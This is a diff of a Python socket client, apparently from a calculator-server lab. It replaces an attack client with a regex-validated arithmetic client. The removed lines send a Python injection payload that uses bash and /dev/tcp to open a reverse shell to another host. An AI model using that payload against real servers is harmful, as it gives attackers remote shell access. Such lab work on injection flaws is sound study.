@@ -1,32 +1,44 @@
 import socket
-import sys
 import re
 import logging
-# On définit la destination de la connexion
-host = '10.33.66.78'  # IP du serveur
-port = 13338          # Port choisir par le serveur
+import sys
 
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-    logger.info("Connexion réussie à %s:%s", host, port)
-    s.send("Ok".encode())
-    data = s.recv(1024)
-    logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
-                
-    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.33.73.77/6666 0>&1').read()"
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger("client")
 
-    s.sendall(userMessage.encode("utf-8"))
-    logger.info("Message envoyé au serveur %s : %s", host, userMessage)
 
-    data = s.recv(1024)
-    s.close()
-    logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
-    print(repr(data.decode()))
-    sys.exit(0)
-   # Assurez-vous que le socket est fermé même en cas d'erreur
-except socket.error as e :
-    logger.error("Impossible de se connecter au serveur %s sur le port %s", host, port)
-    s.close()
-    sys.exit(1)
-# Close the connection.
+host = '10.33.49.113'
+port = 13337
+
+def main():
+    try:
+        # Créer le socket
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((host, port))
+        logger.info("Connexion au serveur %s:%d réussie", host, port)
+
+        # le pattern de l'operation (parfaite)
+        pattern = r'^(-?\d{1,5})\s*([+*-])\s*(-?\d{1,5})$'
+        while True:
+            user_input = input("Veuillez saisir une opération arithmétique : ")
+            if re.match(pattern, user_input):
+                break  # si l'entrée est valide on BREAK
+            else:
+                logger.error("Format invalide. Utilisez seulement les signes (-,+,*) et des nombres entre -100000 et +100000")
+
+        # Envoyer l'opération au serveur
+        client_socket.sendall(user_input.encode('utf-8'))
+        logger.info("Opération envoyée au serveur : %s", user_input)
+
+        # c'est le resultat de server 
+        result = client_socket.recv(1024).decode('utf-8')
+        print("Résultat reçu du serveur :", result)
+
+    except socket.error as e:
+        logger.error("Erreur de connexion au serveur : %s", e)
+        sys.exit(1)
+    finally:
+        client_socket.close()
+
+if __name__ == "__main__":
+    main()
